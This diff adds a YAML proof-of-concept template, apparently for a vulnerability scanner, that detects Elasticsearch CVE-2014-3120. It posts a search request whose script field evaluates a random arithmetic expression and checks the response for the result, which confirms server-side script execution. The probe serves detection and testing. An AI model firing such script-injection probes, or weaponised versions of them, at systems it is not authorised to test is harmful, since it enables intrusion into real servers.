@@ -1,0 +1,36 @@
+detail:
+  author: "suancaiyu\u3001violin"
+  elasticsearch: v1.1.1
+  links:
+  - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120
+expression: r0() && r1()
+manual: true
+name: poc-yaml-elasticsearch-cve-2014-3120
+rules:
+  r0:
+    expression: response.status == 201 || response.status == 200
+    request:
+      body: "{\n  \"name\": \"test\"\n}\n"
+      cache: true
+      headers:
+        Content-Type: application/json
+      method: POST
+      path: /test/test1/123
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r +
+      r1)))
+    request:
+      body: "{\n    \"size\": 1,\n    \"query\": {\n      \"filtered\": {\n      \
+        \  \"query\": {\n          \"match_all\": {\n          }\n        }\n    \
+        \  }\n    },\n    \"script_fields\": {\n        \"command\": {\n         \
+        \   \"script\": \"{{r}}+{{r1}}\"\n        }\n    }\n}"
+      cache: true
+      follow_redirects: true
+      headers:
+        Content-Type: application/json
+      method: POST
+      path: /_search
+set:
+  r: randomInt(800000000, 1000000000)
+  r1: randomInt(800000000, 1000000000)
+transport: http
